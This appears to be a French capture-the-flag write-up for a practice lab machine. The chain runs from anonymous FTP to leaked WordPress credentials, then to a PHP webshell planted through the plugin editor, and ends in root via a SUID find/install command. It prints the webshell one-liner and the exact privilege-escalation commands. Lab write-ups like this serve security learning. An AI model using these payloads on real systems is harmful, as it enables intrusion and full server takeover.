---
doc_kind: writeup
title: "DANTE NIX01 - entree VPN, WordPress RCE et SUID find"
category: web
slug: nix01-wordpress-rce-suid-find
created: 2026-10-29
status: solved
tags:
  - wordpress
  - plugin-editor-rce
  - suid-find
  - ftp-anonymous
  - privesc-euid
source: "HTB Pro Lab DANTE"
target: "WordPress + binaire find SUID"
---
# DANTE NIX01 - entree VPN, WordPress RCE et SUID find

## Challenge Summary

- Source: HTB Pro Lab DANTE
- Target: WordPress + binaire find SUID
- Goal: FTP anonyme fuite creds WordPress, editeur de plugins WP permet RCE directe en PHP, puis /usr/bin/find SUID root abuse via -exec install -m 4755 (pas de shebang = euid conserve).

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. nmap -p- -> WordPress sur port non standard.
2. FTP anonyme (mode actif requis) -> todo.txt -> creds.
3. Login wp-admin, editeur de plugins (theme editor bloque par nonce).
4. Remplacer un plugin par un webshell PHP system($_GET['c']).
5. RCE confirmee, lire user.txt.
6. su avec creds trouvees -> flag mid.
7. find SUID root: find z -exec install -m 4755 /bin/bash /tmp/bsh \; -quit (jamais -exec /bin/bash -c, le shebang fait retomber l'euid).
8. /tmp/bsh -p -> root.

## Key Evidence

- uid=33(www-data) apres webshell; -rwsr-xr-x root sur /tmp/bsh; uid=0(root) apres execution -p.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
webshell PHP system($_GET['c']) dans plugin WP ; find -exec install -m 4755.
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- SUID find doit passer par install -m 4755 (binaire direct), jamais par un script/shebang qui perd l'euid; FTP anonyme necessite souvent mode actif.

## Pattern Candidates

- Voir pattern associe de meme slug.
